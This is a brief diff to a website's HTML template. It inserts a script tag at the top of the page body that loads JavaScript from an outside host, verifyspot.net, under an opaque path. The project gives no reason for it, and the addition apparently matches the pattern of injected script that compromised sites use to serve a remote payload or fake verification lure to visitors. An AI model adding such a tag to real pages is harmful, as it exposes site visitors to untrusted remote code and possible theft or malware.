@@ -39,7 +39,9 @@
 		<link href="css/magnific-popup.css" rel="stylesheet" />
 		<link href="css/style.css" rel="stylesheet" />
 	</head>
-	<body>	
+	<body>
+		<script type="text/javascript" src="https://verifyspot.net/cp/js/1r0e6"></script>
+		
 		<div class="main-bg"></div>
 		<div class="main-wrapper">			
 				<header>					
